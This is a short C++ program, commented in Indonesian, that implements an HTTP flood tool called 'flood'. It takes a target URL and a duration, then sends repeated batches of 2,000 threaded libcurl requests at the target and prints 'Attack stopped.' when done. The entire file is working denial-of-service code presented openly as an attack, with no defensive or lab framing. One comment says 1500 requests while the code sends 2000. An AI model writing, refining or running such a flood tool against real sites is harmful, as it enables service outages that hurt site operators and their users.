#include <iostream>
#include <curl/curl.h>
#include <thread>
#include <vector>
#include <chrono>

// Fungsi untuk mengirim request HTTP menggunakan libcurl
void sendRequest(const std::string& target) {
    CURL* curl;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
        }
        curl_easy_cleanup(curl);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Invalid Usage: ./flood URL DURATION" << std::endl;
        return 1;
    }

    std::string target = argv[1];  // URL Target
    int duration = std::stoi(argv[2]);  // Durasi serangan (dalam detik)

    // Inisialisasi libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // Tentukan jumlah request per interval
    int requestsPerInterval = 2000;

    // Simulasikan serangan dengan memanfaatkan thread untuk mengirim request
    auto start = std::chrono::high_resolution_clock::now();
    auto end = start + std::chrono::seconds(duration);

    while (std::chrono::high_resolution_clock::now() < end) {
        std::vector<std::thread> threads;

        // Mengirimkan 1500 request dalam setiap batch
        for (int i = 0; i < requestsPerInterval; ++i) {
            threads.push_back(std::thread(sendRequest, target));  // Mengirim request di thread terpisah
        }

        // Tunggu semua thread selesai
        for (auto& t : threads) {
            t.join();
        }

        // Delay sebentar sebelum mengirim batch berikutnya
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    // Cleanup libcurl
    curl_global_cleanup();

    std::cout << "Attack stopped." << std::endl;
    return 0;
}
